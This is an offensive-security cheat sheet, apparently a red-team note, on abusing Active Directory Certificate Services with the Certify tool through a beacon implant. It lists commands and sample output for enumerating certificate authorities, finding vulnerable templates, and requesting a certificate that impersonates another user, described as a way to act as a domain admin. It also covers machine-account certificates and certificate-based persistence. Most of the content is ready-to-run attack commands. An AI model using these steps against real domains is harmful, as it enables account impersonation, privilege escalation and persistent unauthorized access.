# Certify

## [[Misconfigured Certificate Templates]]
Get certificat details
``````beacon
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

[*] Root CAs

 Cert SubjectName              : CN=ca-1, DC=evil, DC=corp
 Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
 Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668
 Cert Start Date               : 2/25/2022 11:29:14 AM
 Cert End Date                 : 2/25/2047 11:39:08 AM
 Cert Chain                    : CN=ca-1,DC=evil,DC=corp

[*] Enterprise/Enrollment CAs:

 Enterprise CA Name            : ca-1
 DNS Hostname                  : dc-1.evil.corp
 FullName                      : dc-1.evil.corp\ca-1
 Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
 Cert SubjectName              : CN=ca-1, DC=evil, DC=corp
 Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
 Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668
 Cert Start Date               : 2/25/2022 11:29:14 AM
 Cert End Date                 : 2/25/2047 11:39:08 AM
 Cert Chain                    : CN=ca-1,DC=evil,DC=corp

 Enterprise CA Name            : ca-2
 DNS Hostname                  : dc-2.edu.evil.corp
 FullName                      : dc-2.edu.evil.corp\ca-2
 Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
 Cert SubjectName              : CN=ca-2, DC=edu, DC=evil, DC=corp
 Cert Thumbprint               : 2D0349C77D35808E35A7C6815CF37B51D9A5D431
 Cert Serial                   : 64000000067ED180604220703C000000000006
 Cert Start Date               : 3/1/2022 10:45:07 AM
 Cert End Date                 : 3/1/2024 10:55:07 AM
 Cert Chain                    : CN=ca-1,DC=evil,DC=corp -> CN=ca-2,DC=edu,DC=evil,DC=corp
``````

## Find vulnerable certificates
``````beacon
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
``````

## Request certificate for user
This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain.  Request a certificate.
``````beacon
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.evil.corp\ca-1 /template:VulnerableUserTemplate /altname:nglover

[*] Action: Request a Certificates

[*] Current user context    : EDU\patrick
[*] No subject name specified, using current context as subject.

[*] Template                : VulnerableUserTemplate
[*] Subject                 : CN=Isabel Yates, CN=Users, DC=evil, DC=corp
[*] AltName                 : nglover

[*] Certificate Authority   : dc-1.evil.corp\ca-1

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 4

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA7+QJhT7SgrP2SLWI7JqilriLBFjGRgob7sK6Gt8/EN4ODCqA
[...snip...]
EZCgtNFHJpynmPVNEcocncFPtV1hskXIElcwer/EdIROOW+qZhan
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGKzCCBROgAwIBAgITIQAAAAJ1qRjA3m3TOAAAAAAAAjANBgkqhkiG9w0BAQsF
[...snip...]
Xm58FnNpAvwXQi1Vu+xIdtpRSGsnl6T6/TYwJlhKqMEU9mRfgaWXgLS+HdS++aw=
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:16.3844085
``````

## Request certificate for machine
The `/machine` parameter tells Certify to auto-elevate to SYSTEM and assume the identity of the machine account (for which you need to be running in high-integrity).
``````beacon
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.edu.evil.corp\ca-2 /template:Machine /machine
``````

## [[User & Computer Persistence]]
Find all certificates that permit client auth
To limit the volume of output, we can only return templates from the CA in our current domain, using `/ca:dc-2.edu.evil.corp\ca-2`

Requirements (default):
- Authorized Signatures Required: `0`
- Enrollment Rights: `domain\Domain Users`
- Validity Period: `1 year`

``````
beacon> getuid
[*] You are EDU\patrick

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /clientauth
``````



```meta
requirements: 
results: 
opsec: 
oss: #win
source: https://github.com/GhostPack/Certify
description: Used to query certificate information for [[Misconfigured Certificate Templates]]
```
